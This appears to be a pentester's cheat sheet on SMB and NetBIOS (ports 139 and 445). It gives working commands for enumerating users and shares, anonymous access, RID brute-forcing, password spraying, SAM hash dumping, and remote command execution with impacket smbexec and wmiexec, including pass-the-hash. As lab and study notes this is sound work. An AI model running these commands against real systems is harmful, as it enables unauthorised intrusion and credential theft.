+++
title = "Pentest - SMB p 139,445"
author = ["svejk"]
tags = ["crackmapexec", "smbmap", "smb", "pentest"]
draft = false
+++

[HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb)


## Port 139 [NetBIOS]({{< relref "netbios.md" >}}) {#port-139-netbios--netbios-dot-md}

<span class="underline">NetBIOS</span> is `Network Basic Input Output System`, which is a software protocol that allows applications, PCs, and Desktops on a local area network (LAN) to communicate with network hardware and to transmit data across the network.


## Port 445 [SMB - Server Message Block]({{< relref "smb_server_message_block.md" >}}) {#port-445-smb-server-message-block--smb-server-message-block-dot-md}

While Port 139 is known technically as ‘NBT over IP’, Port 445 is ‘SMB over IP’. SMB stands for ‘Server Message Blocks’.


### SMB {#smb}

Server Message Block (SMB) is a client-server protocol that regulates access to files and entire directories and other network resources such as printers, routers, or interfaces released for the network.


## Server Enumeration {#server-enumeration}

Search for hosts:

```shell { linenos=true, linenostart=1 }
nbtscan -r 192.168.1.1/24
```


### SMB information {#smb-information}

```shell { linenos=true, linenostart=1 }
enum4linux -a [-u "<username>" -p "<passwd>"] <IP>
enum4linux-ng -A [-u "<username>" -p "<passwd>"] <IP>

# connect to rpc
rpcclient -U "" -N <IP> #No creds
rpcclient //machine.htb -U domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb  --pw-nt-hash
rpcclient -U "username%passwd" <IP> #With creds
```

```sh
smbclient //10.10.10.10/Public -U 'anonymous' -N
smbclient -L //dc01.coder.htb -U Guest
```

```shell { linenos=true, linenostart=1 }
nxc smb $IP -u 'user.name' -p 'password'
```

See also impacket: samrdump, rpcdump


### Users, Groups {#users-groups}

```shell { linenos=true, linenostart=1 }
crackmapexec smb 10.10.10.10 --users [-u <username> -p <password>]
crackmapexec smb 10.10.10.10 --groups [-u <username> -p <password>]
crackmapexec smb 10.10.10.10 --groups --loggedon-users [-u <username> -p <password>]
crackmapexec smb 10.10.10.10 -u usernames.txt -p ‘’ --continue-on-success


ldapsearch -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "(&(objectclass=user))" -h 10.10.10.10 | grep -i samaccountname: | cut -f 2 -d " "

```


### Anonymous logon {#anonymous-logon}

```sh
crackmapexec smb <host> -u 'a' -p '' --shares
```


### List files {#list-files}

```sh
crackmapexec smb <host> -u 'a' -p '' -M spider_plus
```


### Download files {#download-files}

```sh
crackmapexec smb <host> -u 'a' -p '' -M spider_plus -o DOWNLOAD_FLAG=TRUE EXCLUDE_DIR=IPC$
```


### IPC$ Share {#ipc-share}

With an anonymous null session you can access the IPC$ share and interact with services exposed via named pipes. The enum4linux utility within Kali Linux is particularly useful; with it, you can obtain the following:

-   Operating system information
-   Details of the parent domain
-   A list of local users and groups
-   Details of available SMB shares
-   The effective system security policy

RID cycling with `crackmapexec`

```shell { linenos=true, linenostart=1 }
crackmapexec smb <ip> -u 'a' -p '' -d <domain> --rid-brute |grep User
```

then, eg, check for UF_DONT_REQUIRE_PREAUTH and [AS-REP Roasting]({{< relref "as_rep_roasting.md" >}}). Then attempt `crackmapexec` with smb and username password combinations.  Passwords from list (eg rockyou), customized list, usernames as passwords (backwards and forwards, case change, etc).


### SMB Command Execution {#smb-command-execution}

```shell { linenos=true, linenostart=1 }
impacket-smbexec administrator:'<password>'@machine.htb
```


#### Dump sam hashes {#dump-sam-hashes}

```shell { linenos=true, linenostart=1 }
crackmapexec smb <IP> -u <username> -p "PASSWORD" --sam
```


#### wmiexec {#wmiexec}

```shell { linenos=true, linenostart=1 }
impacket-wmiexec <user>@<ip> -hashes "<user hash>"
```
